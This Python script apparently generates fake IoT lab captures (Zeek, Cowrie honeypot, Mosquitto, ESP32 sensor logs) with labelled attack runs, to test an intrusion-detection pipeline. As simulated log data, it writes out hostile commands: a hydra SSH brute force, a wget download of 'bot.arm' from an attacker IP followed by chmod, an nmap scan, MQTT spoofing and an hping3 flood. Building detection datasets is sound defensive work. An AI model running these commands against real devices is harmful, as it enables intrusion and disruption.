"""A fake lab: pretends to be Task A for 6 days, so step 9 has more than one capture to split.

Step 9 splits the data by WHOLE captures (train / validation / test). With only the one sample capture there is
nothing to split. Until A delivers real captures, this script writes the same files A will send:

    conn.log (Zeek)   cowrie.json   mosquitto.log   esp32.csv   attack_log.csv

and then loads them with the REAL pipeline: captures -> loaders (step 4, 5) -> attack log + labels (step 6)
-> flow features (step 7) -> windows (step 8). So it also tests that all the steps work together.

    cd backend
    .venv/Scripts/python -m demo.fake_lab                 # add the 6 demo captures (2026-11-21 ... 26)
    .venv/Scripts/python -m demo.fake_lab --keep demo_out # also keep the generated files, to look at them
    .venv/Scripts/python -m demo.fake_lab --remove        # delete everything it added

The demo captures are called cap-demo-01 ... 06. Every capture is 30 minutes of normal lab life (sensor readings
every 10 s, MQTT, DNS, NTP, someone watching the camera, the admin logging in), plus the attacks below:

    cap-demo-01   normal only
    cap-demo-02   bruteforce
    cap-demo-03   vulnerability_scanning, mqtt_spoofing
    cap-demo-04   normal only
    cap-demo-05   dos
    cap-demo-06   all four (so the test split, the last capture, contains every scenario)
"""
from __future__ import annotations

import argparse
import csv
import json
import random
import sys
import tempfile
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path

GW, ESP, CAM, HOST, ATTACKER = "192.168.56.10", "192.168.56.20", "192.168.56.30", "192.168.56.1", "192.168.56.99"
DEMO_PREFIX = "cap-demo-"
MARGIN = timedelta(seconds=2)            # contract clock_rule: attack log times get 2 s of margin on each side

CAPTURES = [
    ("cap-demo-01", "2026-11-21T10:00:00+00:00", []),
    ("cap-demo-02", "2026-11-22T10:00:00+00:00", [("bruteforce", 8)]),
    ("cap-demo-03", "2026-11-23T10:00:00+00:00", [("vulnerability_scanning", 6), ("mqtt_spoofing", 18)]),
    ("cap-demo-04", "2026-11-24T10:00:00+00:00", []),
    ("cap-demo-05", "2026-11-25T10:00:00+00:00", [("dos", 12)]),
    ("cap-demo-06", "2026-11-26T10:00:00+00:00", [("vulnerability_scanning", 4), ("bruteforce", 9),
                                                  ("mqtt_spoofing", 17), ("dos", 23)]),
]                                        # (capture, start, [(scenario, minute it starts)])


@dataclass
class Logs:
    """Everything one capture produces, in A's file formats."""
    conn: list[tuple[float, str]] = field(default_factory=list)
    cowrie: list[tuple[float, str]] = field(default_factory=list)
    mosquitto: list[tuple[float, int, str]] = field(default_factory=list)
    esp32: list[tuple[float, list]] = field(default_factory=list)
    runs: list[dict] = field(default_factory=list)
    sensor_offline: list[tuple[float, float]] = field(default_factory=list)


class Lab:
    def __init__(self, seed: int) -> None:
        self.rng = random.Random(seed)
        self.seq = 0
        self.session_no = 0

    # ---------------------------------------------------------------------------------------- file lines
    def conn(self, logs: Logs, ts: float, src: str, sport: int, dst: str, dport: int, proto: str = "tcp",
             service: str | None = None, duration: float | None = None, ob: int | None = None, rb: int | None = None,
             state: str = "SF", op: int = 1, rp: int = 1) -> None:
        """One Zeek conn.log line (JSON). Zeek leaves a field out when it doesn't know it."""
        d = {"ts": round(ts, 6), "uid": "C" + "".join(self.rng.choices("ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz123456789", k=16)),
             "id.orig_h": src, "id.orig_p": sport, "id.resp_h": dst, "id.resp_p": dport, "proto": proto}
        if service:
            d["service"] = service
        if duration is not None:
            d["duration"] = round(duration, 6)
        if ob is not None:
            d["orig_bytes"], d["resp_bytes"] = ob, rb
        d.update({"conn_state": state, "orig_pkts": op, "resp_pkts": rp})
        logs.conn.append((ts, json.dumps(d)))

    def cowrie(self, logs: Logs, ts: float, eventid: str, session: str, src: str, **fields) -> None:
        stamp = datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
        d = {"eventid": eventid, "timestamp": stamp, "session": session, "src_ip": src, **fields, "sensor": "gw-01"}
        logs.cowrie.append((ts, json.dumps(d)))

    def mosq(self, logs: Logs, ts: float, text: str) -> None:
        self.seq += 1
        logs.mosquitto.append((int(ts), self.seq, f"{int(ts)}: {text}"))

    def session(self) -> str:
        self.session_no += 1
        return f"s{self.session_no:05x}"

    def ssh_session(self, logs: Logs, ts: float, src: str, sport: int, logins: list[tuple[str, str, bool]],
                    commands: list[str], gap: float, download: str | None = None) -> float:
        """One SSH connection to the Cowrie honeypot: the flow, and Cowrie's events. Returns when it ended."""
        s, t = self.session(), ts
        self.cowrie(logs, t, "cowrie.session.connect", s, src, src_port=sport, dst_ip=GW, dst_port=22, protocol="ssh")
        for user, password, ok in logins:
            t += self.rng.uniform(0.6, 1.4)
            self.cowrie(logs, t, "cowrie.login.success" if ok else "cowrie.login.failed", s, src,
                        username=user, password=password)
        for cmd in commands:
            t += gap * self.rng.uniform(0.5, 1.5)
            self.cowrie(logs, t, "cowrie.command.input", s, src, input=cmd)
        if download:
            t += 2
            self.cowrie(logs, t, "cowrie.session.file_download", s, src, url=download, outfile="var/lib/cowrie/downloads/x")
            self.conn(logs, t - 1.5, GW, self.rng.randint(40000, 60000), ATTACKER, 80, service="http", duration=1.4,
                      ob=71, rb=self.rng.randint(15000, 25000), op=21, rp=19)
        t += self.rng.uniform(0.5, 1.5)
        self.cowrie(logs, t, "cowrie.session.closed", s, src, duration=round(t - ts, 2))
        n = len(logins) + len(commands)
        self.conn(logs, ts - 0.01, src, sport, GW, 22, service="ssh", duration=t - ts + 0.01,
                  ob=250 + 40 * n + self.rng.randint(0, 40), rb=300 + 60 * n + self.rng.randint(0, 40),
                  op=10 + 3 * n, rp=9 + 3 * n)
        return t

    # ---------------------------------------------------------------------------------------- normal life
    def normal(self, logs: Logs, t0: float, seconds: int) -> None:
        rng = self.rng
        # The ESP32: connects to the broker, subscribes, and reconnects every 5 minutes (one MQTT flow each time).
        for k, start in enumerate(range(0, seconds, 300)):
            ts = t0 + start + 1
            port = 50000 + rng.randint(0, 9999)
            if k:
                self.mosq(logs, ts, "Client esp32-smoke-01 disconnected.")
            self.mosq(logs, ts, f"New client connected from {ESP}:{port} as esp32-smoke-01 (p2, c1, k60).")
            if k == 0:
                self.mosq(logs, ts, "esp32-smoke-01 0 aegex/cmd/#")
            length = min(299.0, seconds - start - 1.5)
            self.conn(logs, ts - 0.2, ESP, port, GW, 1883, service="mqtt", duration=length,
                      ob=40 + 64 * int(length // 10), rb=4 + 2 * int(length // 60), op=2 + 3 * int(length // 10),
                      rp=2 + 2 * int(length // 10))
        # Every 10 s: a sensor reading (CSV) and its MQTT publish.
        temp, hum = 23.5 + rng.random(), 40 + rng.random() * 2
        for k in range(seconds // 10):
            ts = t0 + 5 + 10 * k
            temp += rng.gauss(0, 0.02)
            hum += rng.gauss(0, 0.05)
            if any(a <= ts <= b for a, b in logs.sensor_offline):
                continue                                    # DoS: the sensor can't send
            smoke = round(12 + rng.gauss(0, 0.3), 1)
            stamp = datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            logs.esp32.append((ts, [stamp, int((ts - t0) * 1000) + 3664, smoke, round(temp, 2), round(hum, 1)]))
            self.mosq(logs, ts, "Received PUBLISH from esp32-smoke-01 (d0, q0, r0, m0, 'aegex/sensors/smoke', ... (58 bytes))")
        # DNS every 5 minutes, NTP every 10 minutes.
        for start in range(60, seconds, 300):
            self.conn(logs, t0 + start + rng.random(), ESP, rng.randint(1024, 65000), GW, 53, "udp", "dns",
                      0.02 + rng.random() * 0.02, 30, 58)
        for start in range(120, seconds, 600):
            for dev in (ESP, CAM):
                self.conn(logs, t0 + start + rng.random() * 5, dev, 123, GW, 123, "udp", "ntp", 0.01, 48, 48)
        # Someone watches the camera 2-3 times (Zeek calls RTSP "http").
        for _ in range(rng.randint(2, 3)):
            ts, length = t0 + rng.uniform(60, seconds - 200), rng.uniform(20, 90)
            self.conn(logs, ts, HOST, rng.randint(50000, 60000), CAM, 554, service="http", duration=length,
                      ob=int(4 * length) + 120, rb=int(2800 * length), op=int(2.2 * length), rp=int(2.2 * length))
        # The admin logs in once, looks around, leaves.
        ts = t0 + rng.uniform(120, seconds - 400)
        self.ssh_session(logs, ts, HOST, rng.randint(50000, 60000), [("pi", "s3cure-Pa55", True)],
                         rng.sample(["uptime", "df -h", "tail /var/log/syslog", "systemctl status mosquitto", "free -m"], 3),
                         gap=20)

    # ---------------------------------------------------------------------------------------- attacks
    def attack(self, logs: Logs, scenario: str, ts: float, run_id: str, capture_id: str) -> None:
        rng, start = self.rng, ts
        if scenario == "bruteforce":
            target, tool, command = "gw-01", "hydra", f"hydra -l root -P rockyou.txt ssh://{GW}"
            passwords = ["123456", "password", "admin", "root", "toor", "1234", "12345678", "qwerty", "pi", "raspberry1"]
            for i in range(rng.randint(25, 35)):
                ts = self.ssh_session(logs, ts, ATTACKER, 40000 + i, [("root", rng.choice(passwords), False)
                                                                     for _ in range(rng.randint(1, 3))], [], gap=0)
                ts += rng.uniform(0.5, 2.5)
            ts = self.ssh_session(logs, ts, ATTACKER, 40100, [("root", "raspberry", True)],
                                  ["uname -a", "cat /proc/cpuinfo", f"wget http://{ATTACKER}/bot.arm", "chmod +x bot.arm"],
                                  gap=4, download=f"http://{ATTACKER}/bot.arm")
        elif scenario == "vulnerability_scanning":
            target, tool, command = "cam-01", "nmap", f"nmap -sS -p 1-1024 {CAM}"
            for port in rng.sample(range(1, 1025), 300):
                ts += rng.uniform(0.02, 0.08)
                if port in (80, 554):                    # open: SYN, SYN-ACK, then nmap resets
                    self.conn(logs, ts, ATTACKER, 61234, CAM, port, state="RSTO", duration=0.0005, ob=0, rb=0, op=2, rp=1)
                elif rng.random() < 0.85:                # closed: the camera answers with a reset
                    self.conn(logs, ts, ATTACKER, 61234, CAM, port, state="REJ", duration=0.0004, ob=0, rb=0)
                else:                                    # filtered: no answer at all
                    self.conn(logs, ts, ATTACKER, 61234, CAM, port, state="S0", rp=0)
        elif scenario == "mqtt_spoofing":
            target, tool, command = "esp32-smoke-01", "mosquitto_pub", f"mosquitto_pub -h {GW} -t aegex/sensors/smoke -m 999 --repeat 45"
            port = rng.randint(40000, 50000)
            self.mosq(logs, ts, f"New client connected from {ATTACKER}:{port} as fake-sensor (p2, c1, k60).")
            for i in range(45):
                self.mosq(logs, ts + 1 + 2 * i, "Received PUBLISH from fake-sensor (d0, q0, r0, m0, 'aegex/sensors/smoke', ... (12 bytes))")
            ts += 92
            self.mosq(logs, ts, "Client fake-sensor disconnected.")
            self.conn(logs, start - 0.2, ATTACKER, port, GW, 1883, service="mqtt", duration=92.5, ob=40 + 45 * 18, rb=8,
                      op=50, rp=48)
        elif scenario == "dos":
            target, tool, command = "esp32-smoke-01", "hping3", f"hping3 -S --flood -p 80 {ESP}"
            length = 60.0
            for _ in range(1500):
                self.conn(logs, ts + rng.uniform(0, length), ATTACKER, rng.randint(1024, 65535), ESP, 80, state="S0", rp=0)
            ts += length
            logs.sensor_offline.append((start, ts + 10))    # the flooded sensor can't send its readings
        else:
            raise ValueError(scenario)
        logs.runs.append({"run_id": run_id, "capture_id": capture_id, "scenario": scenario, "tool": tool,
                          "command": command, "attacker_ip": ATTACKER, "target_device": target,
                          "start_ts": _iso(datetime.fromtimestamp(start, tz=timezone.utc) - MARGIN, round_up=False),
                          "end_ts": _iso(datetime.fromtimestamp(ts, tz=timezone.utc) + MARGIN, round_up=True),
                          "notes": "fake lab"})


def _iso(ts: datetime, round_up: bool) -> str:
    """To whole seconds, rounding outwards (start down, end up), so the run never gets shorter."""
    whole = ts.replace(microsecond=0)
    if round_up and whole < ts:
        whole += timedelta(seconds=1)
    return whole.strftime("%Y-%m-%dT%H:%M:%SZ")


def write_capture(lab: Lab, capture_id: str, t0: datetime, attacks: list[tuple[str, int]], minutes: int, out: Path) -> Logs:
    """Simulate one capture and write its 4 log files into out/<capture_id>/."""
    logs, seconds = Logs(), minutes * 60
    start = t0.timestamp()
    for i, (scenario, minute) in enumerate(attacks, 1):           # attacks first: a DoS takes the sensor offline
        lab.attack(logs, scenario, start + minute * 60 * minutes / 30 + lab.rng.uniform(0, 20),
                   f"run-{capture_id.removeprefix(DEMO_PREFIX)}-{i}", capture_id)
    lab.normal(logs, start, seconds)

    folder = out / capture_id
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "conn.log").write_text("".join(line + "\n" for _, line in sorted(logs.conn)), encoding="utf-8")
    (folder / "cowrie.json").write_text("".join(line + "\n" for _, line in sorted(logs.cowrie)), encoding="utf-8")
    (folder / "mosquitto.log").write_text(f"{int(start)}: mosquitto version 2.0.18 running\n"
                                          + "".join(line + "\n" for *_, line in sorted(logs.mosquitto)), encoding="utf-8")
    with open(folder / "esp32.csv", "w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["time", "esp_ms", "smoke", "temperature_C", "humidity_pct"])
        writer.writerows(row for _, row in sorted(logs.esp32))
    return logs


# ------------------------------------------------------------------------------------------- load with the real pipeline
def build(conn, out: Path, minutes: int = 30, seed: int = 7, captures=CAPTURES, quiet: bool = False) -> list[str]:
    """Write the files for every demo capture, then run steps 4-8 on them. Returns the capture ids."""
    from features.build import build_flow_features, build_window_features
    from ingest.attacks import load_attack_log
    from ingest.captures import add_capture
    from ingest.flows import load_conn_log
    from ingest.loader import label_capture, load_file
    from ingest.parsers import CowrieParser, Esp32CsvParser, MosquittoLogParser

    say = (lambda *_: None) if quiet else print
    lab, runs, ids = Lab(seed), [], []
    for capture_id, start, attacks in captures:
        t0 = datetime.fromisoformat(start)
        logs = write_capture(lab, capture_id, t0, attacks, minutes, out)
        runs += logs.runs
        add_capture(conn, capture_id, t0, t0 + timedelta(minutes=minutes), "attack" if attacks else "normal_only",
                    notes="fake lab (demo.fake_lab), not real data")
        folder = out / capture_id
        loaded = [load_file(conn, CowrieParser("gw-01"), folder / "cowrie.json", capture_id),
                  load_file(conn, MosquittoLogParser("gw-01", broker_ip=GW), folder / "mosquitto.log", capture_id),
                  load_file(conn, Esp32CsvParser("esp32-smoke-01", device_ip=ESP), folder / "esp32.csv", capture_id)]
        flows = load_conn_log(conn, folder / "conn.log", capture_id)
        say(f"{capture_id}: {sum(r.inserted for r in loaded)} events, {flows.inserted} flows, "
            f"attacks: {', '.join(s for s, _ in attacks) or 'none'}")
        ids.append(capture_id)

    attack_log = out / "attack_log.csv"
    with open(attack_log, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=list(runs[0]))
        writer.writeheader()
        writer.writerows(runs)
    say(f"attack log: {load_attack_log(conn, attack_log)}".splitlines()[0])
    for capture_id in ids:
        label_capture(conn, capture_id)
        build_flow_features(conn, capture_id)
        say(build_window_features(conn, capture_id))
    return ids


def remove(conn) -> None:
    """Delete everything the fake lab added (only cap-demo-* rows)."""
    like = DEMO_PREFIX + "%"
    with conn.transaction():
        for table in ("feature_windows", "flows", "events", "attack_runs", "captures"):
            n = conn.execute(f"DELETE FROM {table} WHERE capture_id LIKE %s", (like,)).rowcount
            print(f"deleted {n} rows from {table}")


def main() -> int:
    from ingest.db import connect

    ap = argparse.ArgumentParser(prog="python -m demo.fake_lab", description="Add 6 fake captures for step 9.")
    ap.add_argument("--keep", metavar="DIR", help="write the generated log files here (default: a temp folder, deleted)")
    ap.add_argument("--minutes", type=int, default=30, help="length of each capture (default 30)")
    ap.add_argument("--seed", type=int, default=7, help="same seed = same data")
    ap.add_argument("--remove", action="store_true", help="delete all demo captures and their data")
    a = ap.parse_args()

    with connect() as conn:
        if a.remove:
            remove(conn)
            return 0
        existing = conn.execute("SELECT count(*) FROM captures WHERE capture_id LIKE %s", (DEMO_PREFIX + "%",)).fetchone()[0]
        if existing:
            print(f"the demo captures are already there ({existing}). Remove them first: python -m demo.fake_lab --remove",
                  file=sys.stderr)
            return 1
        if a.keep:
            build(conn, Path(a.keep), a.minutes, a.seed)
            print(f"files kept in {a.keep}")
        else:
            with tempfile.TemporaryDirectory() as tmp:
                build(conn, Path(tmp), a.minutes, a.seed)
    return 0


if __name__ == "__main__":
    sys.exit(main())
